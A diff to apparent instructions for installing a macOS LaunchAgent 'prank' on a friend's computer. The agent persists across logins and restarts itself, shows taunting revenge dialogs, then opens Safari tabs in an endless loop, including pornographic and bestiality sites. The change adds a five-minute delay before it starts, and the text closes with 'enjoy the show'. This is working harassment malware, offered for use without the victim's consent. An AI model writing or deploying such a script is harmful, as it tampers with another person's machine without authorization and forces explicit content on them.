@@ -21,22 +21,21 @@ cat > ~/Library/LaunchAgents/com.friend.prank.plist << 'EOF'
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>Label</key>
-    <string>com.friend.prank</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/bin/bash</string>
-        <string>-c</string>
-        <string>osascript -e "display dialog \"So I heard you like to draw things in notebooks...\" buttons {\"Who is this?\"} default button 1 with title \"Hello Friend\"" && osascript -e "display dialog \"Your artistic talents have been noted. And so has your habit of opening certain websites on my computer.\" buttons {\"Oh...\"} default button 1 with title \"About Your Hobbies\"" && osascript -e "display dialog \"What goes around comes around, my friend.\" buttons {\"Wait what?\"} default button 1 with title \"Fair Warning\"" && osascript -e "display dialog \"Hope you enjoy closing all these tabs as much as I enjoyed finding your browser history on my computer.\" buttons {\"I deserve this\"} default button 1 with title \"Sweet Revenge\"" && while true; do open -a Safari https://en.wikipedia.org/wiki/Skibidi_Toilet && sleep 2 && open -a Safari https://www.livescience.com/animals/monkeys/primates-have-been-masturbating-for-at-least-40-million-years && sleep 2 && open -a Safari https://www.icegay.tv/categories && sleep 2 && open -a Safari https://sexmix.net/horse-sex/ && sleep 2; done</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
+   <key>Label</key>
+   <string>com.friend.prank</string>
+   <key>ProgramArguments</key>
+   <array>
+       <string>/bin/bash</string>
+       <string>-c</string>
+       <string>sleep 300 && osascript -e "display dialog \"So I heard you like to draw things in notebooks...\" buttons {\"Who is this?\"} default button 1 with title \"Hello Friend\"" && osascript -e "display dialog \"Your artistic talents have been noted. And so has your habit of opening certain websites on my computer.\" buttons {\"Oh...\"} default button 1 with title \"About Your Hobbies\"" && osascript -e "display dialog \"What goes around comes around, my friend.\" buttons {\"Wait what?\"} default button 1 with title \"Fair Warning\"" && osascript -e "display dialog \"Hope you enjoy closing all these tabs as much as I enjoyed finding your browser history on my computer.\" buttons {\"I deserve this\"} default button 1 with title \"Sweet Revenge\"" && while true; do open -a Safari https://en.wikipedia.org/wiki/Skibidi_Toilet && sleep 2 && open -a Safari https://www.livescience.com/animals/monkeys/primates-have-been-masturbating-for-at-least-40-million-years && sleep 2 && open -a Safari https://www.icegay.tv/categories && sleep 2 && open -a Safari https://sexmix.net/horse-sex/ && sleep 2; done</string>
+   </array>
+   <key>RunAtLoad</key>
+   <true/>
+   <key>KeepAlive</key>
+   <true/>
 </dict>
 </plist>
 EOF
-
 launchctl load ~/Library/LaunchAgents/com.friend.prank.plist
 ```
 Press Enter and enjoy the show!
